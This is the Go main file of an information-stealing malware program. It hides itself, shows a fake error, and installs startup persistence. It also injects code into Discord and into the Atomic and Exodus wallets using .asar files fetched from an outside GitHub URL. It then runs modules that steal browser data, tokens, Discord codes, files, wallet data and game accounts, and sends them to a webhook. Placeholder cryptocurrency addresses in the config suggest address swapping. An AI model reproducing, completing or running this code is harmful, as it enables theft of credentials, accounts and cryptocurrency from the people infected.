package main

import (
	"github.com/0xFl4q/1237FHJQSDF1234/modules/browsers"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/commonfiles"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/discodes"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/discordinjection"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/fakeerror"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/games"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/startup"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/system"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/tokens"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/wallets"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/walletsinjection"
	"github.com/0xFl4q/1237FHJQSDF1234/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "s",
		"cryptos": map[string]string{
			"BTC": "s",
			"ETH": "s",
			"MON": "s",
			"LTC": "s",
			"XCH": "ss",
			"PCH": "",
			"CCH": "s",
			"ADA": "s",
			"DASH": "ss",
		},
		"modules": map[string]bool{
			"system":           true,
			"browsers":         true,
			"tokens":           true,
			"discodes":         true,
			"commonfiles":      true,
			"wallets":          true,
			"games":            true,
			"discordinjection": true,
			"walletsinjection": true,
			"fakeerror":        true,
			"startup":          true,
		},
	}
	program.HideSelf()
	if program.IsInStartupPath() && CONFIG["modules"].(map[string]bool)["fakeerror"] {
		go fakeerror.Run()
		go startup.Run()
	}
	if CONFIG["modules"].(map[string]bool)["discordinjection"] {
		go discordinjection.Run(CONFIG["webhook"].(string))
	}
	if CONFIG["modules"].(map[string]bool)["walletsinjection"] {
		go walletsinjection.Run(
			"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
			"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
			CONFIG["webhook"].(string),
		)
	}
	actions := map[string]func(string){
		"system":      system.Run,
		"browsers":    browsers.Run,
		"tokens":      tokens.Run,
		"discodes":    discodes.Run,
		"commonfiles": commonfiles.Run,
		"wallets":     wallets.Run,
		"games":       games.Run,
	}
	for module, action := range actions {
		if CONFIG["modules"].(map[string]bool)[module] {
			go action(CONFIG["webhook"].(string))
		}
	}
}
